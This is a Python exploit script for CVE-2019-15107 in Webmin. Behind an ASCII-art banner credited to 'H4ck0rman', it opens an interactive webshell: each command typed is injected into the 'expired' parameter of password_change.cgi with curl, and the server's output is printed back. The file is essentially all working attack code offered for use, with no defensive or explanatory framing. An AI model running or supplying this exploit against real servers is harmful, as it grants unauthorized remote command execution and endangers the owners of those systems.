#!/usr/bin/env python3
import os
import sys

class WebMinExploit:
    SIGNATURE = '''
                                     @@@@@@@@@@                                                
                               ,@@@@@@@@@@@@@@@                                 
                          @@@@@@@@@@@@@@@@@@@@@@                                
                          @@@@@@@@@@@@@@@@@@@@@@                                
                           @@@@@@@@@@@@@@@@@@@@@@                               
                           @@@@@@@@@@@@@@@@@@@@@@                               
                           ,@@@@@@@@@@@@@@@@@@@@@@                              
                            @@@@@@@@@@@@@@@@@@@@@@                              
                            @@@@@@@@@@@@@@@@@@@@@@@@@@                             
                             @@@@@@@@@@@@@@@@@@@@@@@@@@@                          
                          @@@@@@@@@@@@@@@@@@@@@@@@@                             
                       %      @@@@@@@@@@@@@@@@@@@@@@                            
                              @@@@@@@@@@@@@@@@@@@@@@@                           
                               @@@@@@@@@@@@@@@@@                                
                                @@@@@@@@@@@@@@@    @@                            
                               @@@@@@@@@@@@@@@@@@@@@ 
                                @@@@@@@@@@@@@@@                           
                             @@@@@@@@@@@@@@@@@                                  
                                     @@@@@@@@@@                                 
                                          @@@@@                                 
                                             @@                                 
                                               #     

                        WEBMIN REMOTE CODE EXECUTION WEBSHELL 
                                  CVE-2019-15107
                                    H4ck0rman
    '''
    OKGREEN = '\033[92m'
    ENDC = '\033[0m'


    def webshell(self, baseURL : str):
        '''
        Sends a malicious payload to Webmin portal to exploit an Remote Code Execution bug. Continuosly takes in commands to be sent to the server and prints the resulting output.
        '''
        print(self.OKGREEN,self.SIGNATURE)
        # Get the vulnerable URL and prepare the referer header string
        vulnerableURL = f"{baseURL}/password_change.cgi"
        headers = f"Referer: {baseURL}/session_login.cgi"

        # Continuously take commands as input and execute on server through RCE
        while True:
            command = input(f'{self.OKGREEN}${self.ENDC} ')
            payload = f'user=gotroot&pam=&expired=2|echo "";{command}'
            os.system(f"curl -s -k {vulnerableURL} -d '{payload}' -H '{headers}' | grep -v '^<.*'")



if len(sys.argv) != 2:
    print("Wrong Usage : python3 exploit.py https://webmin-site.com:10000/")
    exit()

baseURL = sys.argv[1].strip('/')   
WebMinExploit().webshell(baseURL)

